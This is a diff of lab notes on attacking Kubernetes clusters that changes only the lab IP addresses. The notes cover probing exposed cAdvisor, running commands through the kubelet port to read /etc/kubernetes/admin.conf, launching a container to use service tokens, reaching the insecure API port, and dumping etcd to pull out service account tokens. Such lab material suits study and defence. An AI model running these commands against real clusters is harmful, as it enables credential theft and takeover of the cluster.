@@ -4,7 +4,7 @@
 
 kubectl create -f example.yaml
 
-This should spin up the guestbook example using the repo. on 192.168.111.50 (don't forget to start this VM)
+This should spin up the guestbook example using the repo. on 192.168.200.50 (don't forget to start this VM)
 
 then kubectl get svc to get a note of the port to check for the service.
 
@@ -17,7 +17,7 @@ to demonstrate the service running
 
 The cAdvisor port is exposed by default in many k8s installations at 4194/TCP.  So in a browser assuming that we have access to the cluster over a network we can simply browse to the port to look around
 
-http://192.168.111.10:4194 
+http://192.168.200.10:4194 
 
 and it'll show us information relating to the cluster.  Whilst none of it is an immediate slam dunk compromise, it does provide quite a bit of interesting info. that could be useful.
 
@@ -41,11 +41,11 @@ Attacking the main kubelet port we can do a lot more, if it's exposed.
 
 https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver/
 
-curl -k -XPOST "https://192.168.111.10:10250/run/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver" -d "cmd=cat /etc/kubernetes/admin.conf"
+curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver" -d "cmd=cat /etc/kubernetes/admin.conf"
 
 # Using Service Tokens
 
-kubectl run badcontainer --image=192.168.111.50:5000/alpine-containertools
+kubectl run badcontainer --image=192.168.200.50:5000/alpine-containertools
 
 No config needed, it just knows where to go.
 
@@ -53,12 +53,12 @@ No config needed, it just knows where to go.
 
 Externally you'd expect most clusters to require authentication externally, however if the well named "insecure port" is exposed on port 8080 it's relatively simple to get access
 
-kubectl -s=http://192.168.111.10:8080 get nodes
+kubectl -s=http://192.168.200.10:8080 get nodes
 
 ## Attacking etcd
 
 export ETCDCTL_API=3
-etcdctl --endpoints=http://192.168.111.10:2379 snapshot save test2.db
+etcdctl --endpoints=http://192.168.200.10:2379 snapshot save test2.db
 
 This dumps the etcd database into a file.  It's not pure text however things like service account tokens are stored in there, so it should be relatively easy to extract that information from the system.
 
